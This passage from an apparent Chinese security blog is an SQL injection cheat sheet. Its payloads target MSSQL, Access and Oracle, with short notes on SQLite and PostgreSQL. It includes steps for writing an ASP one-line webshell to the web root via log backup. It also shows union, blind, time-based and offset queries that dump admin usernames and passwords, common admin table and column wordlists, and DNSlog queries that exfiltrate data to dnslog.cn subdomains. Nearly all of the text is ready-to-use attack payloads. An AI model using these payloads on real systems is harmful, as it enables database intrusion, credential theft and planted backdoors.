备份当前数据库日志到文件</p><p><a href="http://xxxxx/show.aspx?code=1%27;backup">http://xxxxx/show.aspx?code=1&#39;;backup</a> log abc to disk&#x3D;‘e:\xampp\htdocs\dvwa’ with init –</p><p>备份数据库日志到服务器上，其中路径是网页的物理路径。</p><p>(3) 建立一张表和一个字段</p><p><a href="http://xxxxx/show.aspx?code=1%27;create">http://xxxxx/show.aspx?code=1&#39;;create</a> table tt(a text) –</p><p>(4) 往表中插入一句话马子</p><p><a href="http://xxxxx/show.asp?code=1%27;insert">http://xxxxx/show.asp?code=1&#39;;insert</a> into tt(a) values(’&lt;%eval request(“abc”) %&gt;’) –</p><p>values中的内容一般转换为马子的hex值。</p><p>(5) 再次备份日志</p><p><a href="http://xxxxx/show.asp?code=1%27;backup">http://xxxxx/show.asp?code=1&#39;;backup</a> log ahykd_new to disk&#x3D;‘e:\xampp\htdocs\dvwa\1.aspx’ –</p><p>再次备份日志，备份路径为网站服务器的物理路径</p><p>(6) 删除表</p><p><a href="http://xxxxx/show.aspx?code=1%27;drop">http://xxxxx/show.aspx?code=1&#39;;drop</a> table tt –</p><p>然后菜刀尝试连接<a href="http://xxxxx/1.aspx">http://xxxxx/1.aspx</a></p><h2 id="Access注入"><a href="#Access注入" class="headerlink" title="Access注入"></a>Access注入</h2><p>Access数据库没有记录所有表名和列名的表，也就意味着我们需要依靠字典进行猜解表名和列</p><p>Access数据库中没有注释符号.因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。</p><p>sqlmap语句：python sqlmap.py -u “<a href="http://test.com/1.asp?id=1">http://test.com/1.asp?id=1</a>“ –tables</p><h3 id="普通注入-2"><a href="#普通注入-2" class="headerlink" title="普通注入"></a>普通注入</h3><p>判断注入点</p><p>在参数后面加 单引号</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a>‘ #页面报错</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1&#x3D;1 #页面正常</p><p><a href="http://www.example.com/new_list.asp?id=1">http://www.example.com/new_list.asp?id=1</a> and 1&#x3D;2 #页面报错</p><p>猜字段： 1 order by 4 报错 1 order by 3 正确</p><h3 id="有回显："><a href="#有回显：" class="headerlink" title="有回显："></a>有回显：</h3><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 from admin（此时页面有显示2、3）</p><p>查列：and exists (select 列名 from 表名) （假设存在user、password）</p><p>?id&#x3D;3 and exists (select * from test)</p><p>?id&#x3D;3 and exists (select * from admin)</p><p>?id&#x3D;3 and exists (select name from admin) 报错，说明不存在</p><p>?id&#x3D;3 and exists (select username from admin) 说明存在username</p><p>?id&#x3D;3 and exists (select password from admin) 说明存在password</p><p>?id&#x3D;-1 union select 1,2,3,4,5,6,7,8,9,10 找到注入位</p><p>?id&#x3D;-1 union select 1,user,password,4,5,6,7,8,9,10 from admin（即可爆出账号密码）</p><h3 id="无回显："><a href="#无回显：" class="headerlink" title="无回显："></a>无回显：</h3><p>查表：and exists (select * from 表名) 存在的话就返回正常 不存在就返回不正常</p><p>查列：and exists (select 列名 from 表名)</p><p>查内容：and (select top 1 asc(mid(user,1,1))from admin)&#x3D;97</p><p>and (select top 1 asc(mid(user,2,1))from admin)&#x3D;97 猜字段(username)中第一条记录内容的第二个字符</p><p>and (select top 2 asc(mid(user,1,1))from admin)&#x3D;97 猜字段(username)中第二条记录内容的第一个字符</p><h3 id="偏移注入（回显数连续）"><a href="#偏移注入（回显数连续）" class="headerlink" title="偏移注入（回显数连续）"></a>偏移注入（回显数连续）</h3><p>假设已经判断存在admin表，order by下判断有35行，且回显如下回显字段连续</p><p><img src="https://image.3001.net/images/20220714/1657765814_62cf7fb6ed96ca3d6341d.png!small" alt="image"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,* from admin –返回错误页面</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,* from admin –返回到一个错误页面提示查询语句出错，因此admin表的列数为6</p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin</p><p>因为回显如下图 28 29 30是连着的，直接在27后加表名.*</p><p><img src="https://image.3001.net/images/20220714/1657765836_62cf7fcc12b6e7da878c0.png!small" alt="image"></p><p>爆出内容<br><img src="https://image.3001.net/images/20220714/1657765847_62cf7fd738ed7ab7c3339.png!small" alt="image"></p><p>UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,admin.*,34,35 from admin where id &#x3D; 3 添加where id &#x3D;数值，可得到更多的内容</p><h3 id="偏移注入（常规操作）"><a href="#偏移注入（常规操作）" class="headerlink" title="偏移注入（常规操作）"></a>偏移注入（常规操作）</h3><p>Access偏移注入：表名知道，列名无法获取的情况下。</p><p>存在注入点，且order by下判断出字段数为22行</p><p><strong>爆出显位</strong></p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 from admin</p><p>*****<strong>号判断直到页面错误有变化</strong></p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,* from admin 正确</p><p>说明admin有6个字段</p><p>*<em>Access*</em>*<em>偏移注入</em>*，基本公式为：</p><p>order by 出的字段数减去*号的字段数，然而再用order by的字段数减去2倍刚才得出来的答案；</p><p>也就是：</p><p>* &#x3D; 6个字符</p><p>2 × * &#x3D; 12个字符</p><p>22 - 12 &#x3D; 10个字符</p><p>一级偏移语句：</p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,5,6,7,8,9,10,* from (admin as a inner join admin as b on a.id &#x3D; b.id)</p><p>二级偏移语句：</p><p>127.0.0.1&#x2F;asp&#x2F;index.asp?id&#x3D;1513 union select 1,2,3,4,a.id,b.id,c.id,* from ((admin as a inner join admin as b on a.id &#x3D; b.id)inner join admin as c on a.id&#x3D;c.id)</p><p>实战常见的表和列（也可以用sqlmap的，但是量大且效率低）</p><p>常见的表有（最后根据企业名的缩写搭配上admin、user、name）</p><p>admin admins admin_user admin_usr admin_msg admin_login user username manager msg_user msg_login useradmin product、news、usr、system、article、customer、area</p><p>admin_id、admin_name、admin_password</p><p>常见的列</p><p>admin admin_user username password passwd pass pwd users usr user_login user_name login_name name等等</p><p>oracle注入(jsp)</p><p><img src="https://image.3001.net/images/20220714/1657765866_62cf7fea9f4e6948d11dd.png!small" alt="image"></p><h2 id="常规有回显注入"><a href="#常规有回显注入" class="headerlink" title="常规有回显注入"></a>常规有回显注入</h2><p>order by 3–</p><p>and 1&#x3D;2 union select null,null,null from dual–</p><p>and 1&#x3D;2 union select ‘null’,null,null from dual– &#x2F;&#x2F;返回正常，则第一个字段是数字型，返回错误，为字符型</p><p>and 1&#x3D;2 union select 1,’2’,’3’ from dual– &#x2F;&#x2F;判断显示位</p><p>and 1&#x3D;2 union select null,(select banner from sys.v_$version where rownum&#x3D;1),null from dual– &#x2F;&#x2F;探测数据库版本信息</p><p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1),null from dual– &#x2F;&#x2F;查询第一个表名</p><p>and 1&#x3D;2 union select null,(select table_name from user_tables where rownum&#x3D;1 and table_name&lt;&gt;’STUDENT’),null from dual– &#x2F;&#x2F;第二个表名</p><p>获取关键表中的列名：</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and rownum&#x3D;1),null from dual –</p><p>‘ union select null,(select column_name from user_tab_columns where table_name&#x3D;’T_USER’ and column_name&lt;&gt;’SUSER’ and column_name&lt;&gt;’SPWD’ and column_name&lt;&gt;’SNAME’ and rownum&#x3D;1),null from dual –</p><p>and 1&#x3D;2 union select SNAME,SUSER,SPWD from T_USER where id&#x3D;1– &#x2F;&#x2F;查看数据</p><h3 id="第二种常规注入"><a href="#第二种常规注入" class="headerlink" title="第二种常规注入"></a>第二种常规注入</h3><p>确定回显位，假设当前共2个字段，全是数字型，判断方式如下：<br>and 1&#x3D;2 union select 1,2 from dual　　假设回显位是2，爆当前数据库中的第一个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1) from dual　　爆当前数据库中的第二个表：<br>and 1&#x3D;2 union select 1,(select table_name from user_tables where rownum&#x3D;1 and table_name not in (‘第一个表’)) from dual　　以此类推去爆第n个表<br>爆某表中的第一个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名（大写的）’) from dual　　爆某表中的第二个字段：<br>and 1&#x3D;2 union select 1,(select column_name from user_tab_columns where rownum&#x3D;1 and table_name&#x3D;’表名’ and column_name not in (‘第一个字段’)) from dual　　爆其它字段以此类推<br>爆某表中的第一行数据：<br>and 1&#x3D;2 union select 1,字段1||字段2…||字段n from 表名 where rownum&#x3D;1 –连接多个字段用到的连接符号是||,在oracle数据库中，concat函数只能连接两个字符串</p><h3 id="报错注入-2"><a href="#报错注入-2" class="headerlink" title="报错注入"></a>报错注入</h3><p>利用 utl_inaddr.get_host_name<br>这种方法在Oracle 8g，9g，10g中不需要任何权限，但是在Oracle 11g以及以后的版本中，当前数据库用户必须有网络访问权限。</p><p>jsp?name&#x3D;’ and 1&#x3D;utl_inaddr.get_host_name((select user from dual)) –</p><p>ctxsys.drithsx.sn()</p><p>jsp?name&#x3D;’ and 1&#x3D;ctxsys.drithsx.sn(1,(select user from dual)) –</p><p>dbms_xdb_version.checkin()</p><p>jsp?name&#x3D;1’ and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null—</p><p>dbms_utility.sqlid_to_sqlhash()</p><p>jsp?name&#x3D;1’ and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null –</p><p>XMLType()</p><p>sname&#x3D;1′ and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null –</p><h3 id="布尔注入-1"><a href="#布尔注入-1" class="headerlink" title="布尔注入"></a>布尔注入</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">jsp?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20220714/1657765888_62cf80001865e22a5f8e0.png!small" alt="image"></p><p>username&#x3D;admin’ and (select substr(user, 1, 1) from dual)&#x3D;’S’ –</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>主要用DBMS_PIPE.RECEIVE_MESSAGE</p><p>即user的第一位是”A”时，延时5秒执行。</p><p>And 1&#x3D;(select decode(substr(user,1,1),’A’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>第二位是D时，延时5秒</p><p>And 1&#x3D;(select decode(substr(user,2,1),’D’,DBMS_PIPE.RECEIVE_MESSAGE(‘a’,5) ,0) from dual)</p><p>news.jsp?id&#x3D;1 and 1&#x3D;(select decode(substr(user,1,1),’S’,dbms_pipe.receive_message(‘RDS’,5),0) from dual) –</p><h3 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h3><p>utl_inaddr.get_host_address</p><p>select utl_inaddr.get_host_address((select user from dual)||’.cbb1ya.dnslog.cn’) from dual</p><p>SYS.DBMS_LDAP.INIT 这个函数在 10g&#x2F;11g 中是 public 权限.</p><p>SELECT DBMS_LDAP.INIT((select user from dual)||’.24wypw.dnslog.cn’,80) FROM DUAL;</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><h2 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h2><p>如果您的站点允许用户通过网页输入，并将输入内容插入到 SQLite 数据库中，这个时候您就面临着一个被称为 SQL 注入的安全问题。本章节将向您讲解如何防止这种情况的发生，确保脚本和 SQLite 语句的安全。</p><p>1.Sqlite-master:这个是内置系统表、相当于mysql的information_schema</p><p>但是这里只存有表的信息，里面有个sql字段，有各个表的结构，有表名，字段名和类型</p><p>2.sqlite并不支持像mysql那样的注释，但是可以通过 — 方式增加DDL注释(写shell会用到)</p><h2 id="Postsql注入"><a href="#Postsql注入" class="headerlink" title="Postsql注入"></a>Postsql注入</h2><p>PostgreSQL是一种特性非常齐全的自由软件的对象-关系型数据库管理系统（ORDBMS），4.2版本为基础的对象关系型数据库管理系统。</p><p>PostgreSQL安装后，默认的端口是：5432，默认的用户名是： postgres ，默认的数据库也是：postgres 。</p><ul><li>注释符：–</li><li>延时函数：pg_sleep(3)</li></ul><p><img src="https://image.3001.net/images/20220714/1657765907_62cf8013ada166b4cf32d.png!small" alt="image"></p><h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h2><p><code>基础知识</code><br>Oracle 使用查询语句获取数据时需要跟上表名，没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则，Oracle保证dual里面永远只有一条记录。</p><p>Oracle的数据类型是强匹配的(MYSQL有弱匹配的味道)，所以在Oracle进行类似UNION查询数据时候必须让对应位置上的数据类型和表中的列的数据类型是一致的，也可以使用null代替某些无法快速猜测出数据类型的位置。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
